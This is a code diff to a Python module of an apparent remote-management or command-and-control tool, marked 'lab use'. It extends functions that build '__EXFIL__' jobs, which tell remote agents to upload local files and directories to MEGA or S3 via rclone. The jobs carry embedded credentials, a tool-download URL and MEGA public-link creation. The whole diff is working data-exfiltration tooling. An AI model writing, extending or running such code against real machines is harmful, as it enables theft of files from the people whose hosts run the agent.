@@ -1,9 +1,10 @@
 """rclone exfil profiles and agent job payloads (lab use).
 
-Remote profiles (MEGA, S3, …) are configured on the RMM server. When an operator
-queues exfil, the server embeds ephemeral ``RCLONE_CONFIG_*`` variables in the
-``__EXFIL__`` command; the agent runs ``rclone copyto`` (file) or ``rclone copy``
-(directory) locally.
+Remote profiles (MEGA, S3, …) are configured by the active operator workspace
+in workspace mode, or by the RMM server in the legacy server mode. When an
+operator queues exfil, the selected process embeds ephemeral
+``RCLONE_CONFIG_*`` variables in the ``__EXFIL__`` command; the agent runs
+``rclone copyto`` (file) or ``rclone copy`` (directory) locally.
 """
 
 from __future__ import annotations
@@ -36,6 +37,11 @@ _PROFILE_KEY_MAP = {
 
 class RcloneConfigError(Exception):
     """Profile or rclone binary configuration is invalid."""
+
+
+def get_rclone_default_profile() -> str:
+    """Return the current default profile name from the process environment."""
+    return os.environ.get("RMM_RCLONE_DEFAULT_PROFILE", "").strip() or DEFAULT_PROFILE
 
 
 def _env_int(name: str, default: int) -> int:
@@ -83,10 +89,21 @@ def _mask_profile(name: str, profile: dict) -> dict:
     return masked
 
 
-def load_profiles() -> dict[str, dict]:
-    """Load named rclone remote profiles from env or file."""
-    raw = os.environ.get("RMM_RCLONE_PROFILES", "").strip()
-    path = os.environ.get("RMM_RCLONE_PROFILES_FILE", "").strip()
+def load_profiles(
+    path_override: str | None = None,
+    raw_override: str | None = None,
+) -> dict[str, dict]:
+    """Load named rclone remote profiles from an override, env, or example file."""
+    raw = (
+        str(raw_override).strip()
+        if raw_override is not None
+        else os.environ.get("RMM_RCLONE_PROFILES", "").strip()
+    )
+    path = (
+        str(path_override).strip()
+        if path_override is not None
+        else os.environ.get("RMM_RCLONE_PROFILES_FILE", "").strip()
+    )
     if path:
         with open(path, encoding="utf-8") as f:
             data = json.load(f)
@@ -111,8 +128,9 @@ def load_profiles() -> dict[str, dict]:
     return out
 
 
-def get_profile(name: str) -> dict:
-    profiles = load_profiles()
+def get_profile(name: str, profiles: dict[str, dict] | None = None) -> dict:
+    """Return one named profile from the supplied or configured collection."""
+    profiles = profiles if profiles is not None else load_profiles()
     if name not in profiles:
         known = ", ".join(sorted(profiles)) or "(none)"
         raise RcloneConfigError(
@@ -161,14 +179,39 @@ def resolve_dest_path(profile: dict, local_path: str, dest: str | None) -> str:
     return base
 
 
+def build_plugin_exfil_job(
+    local_path: str,
+    profile_name: str,
+    *,
+    dest: str | None = None,
+    max_minutes: int = 30,
+    profiles: dict[str, dict] | None = None,
+    max_bytes: int | None = None,
+) -> dict:
+    """Build the in-process Go plugin job for one local profile."""
+    profile = get_profile(profile_name, profiles)
+    return {
+        "source": local_path,
+        "account": RCLONE_REMOTE_NAME,
+        "backend": profile.get("type"),
+        "target": resolve_dest_path(profile, local_path, dest),
+        "settings": profile_to_plugin_settings(profile),
+        "make_link": bool(profile.get("type") == "mega"),
+        "max_minutes": max(1, int(max_minutes)),
+        "max_bytes": get_rclone_max_bytes() if max_bytes is None else max(0, int(max_bytes)),
+    }
+
+
 def build_exfil_payload(
     local_path: str,
     profile_name: str,
     *,
     dest: str | None = None,
+    profiles: dict[str, dict] | None = None,
+    max_bytes: int | None = None,
 ) -> dict:
     """JSON payload embedded in the agent ``__EXFIL__`` command."""
-    profile = get_profile(profile_name)
+    profile = get_profile(profile_name, profiles)
     remote = RCLONE_REMOTE_NAME
     env_skip_obscure: list[str] = []
     if profile.get("pass_obscured"):
@@ -181,7 +224,7 @@ def build_exfil_payload(
         "env": profile_to_rclone_env(profile),
         "env_skip_obscure": env_skip_obscure,
         "remote_name": remote,
-        "max_bytes": get_rclone_max_bytes(),
+        "max_bytes": get_rclone_max_bytes() if max_bytes is None else max(0, int(max_bytes)),
         "rclone_url": RCLONE_TOOLS_URL,
         "link_command": bool(profile.get("type") == "mega"),
     }
@@ -194,13 +237,25 @@ def build_exfil_command(
     dest: str | None = None,
 ) -> str:
     payload = build_exfil_payload(local_path, profile_name, dest=dest)
+    return build_exfil_command_from_payload(payload)
+
+
+def build_exfil_command_from_payload(payload: dict) -> str:
+    """Serialize a workspace-built binary exfil payload for the agent queue."""
+    if not isinstance(payload, dict) or not str(payload.get("local_path") or "").strip():
+        raise RcloneConfigError("invalid rclone exfil payload")
     return f"__EXFIL__\n{json.dumps(payload, separators=(',', ':'))}"
 
 
-def rclone_public_config() -> dict:
+def rclone_public_config(
+    *,
+    profiles: dict[str, dict] | None = None,
+    default_profile: str | None = None,
+    max_bytes: int | None = None,
+) -> dict:
     """Operator-safe rclone status (no secrets)."""
     try:
-        profiles = load_profiles()
+        profiles = profiles if profiles is not None else load_profiles()
     except (OSError, json.JSONDecodeError, RcloneConfigError) as exc:
         profiles = {}
         load_error = str(exc)
@@ -208,8 +263,8 @@ def rclone_public_config() -> dict:
         load_error = None
     return {
         "upload_location": "agent",
-        "max_bytes": get_rclone_max_bytes(),
-        "default_profile": DEFAULT_PROFILE,
+        "max_bytes": get_rclone_max_bytes() if max_bytes is None else max(0, int(max_bytes)),
+        "default_profile": default_profile or get_rclone_default_profile(),
         "rclone_binary": rclone_binary_available(),
         "rclone_binary_path": RCLONE_BIN_PATH if rclone_binary_available() else None,
         "profiles": [_mask_profile(n, p) for n, p in sorted(profiles.items())],
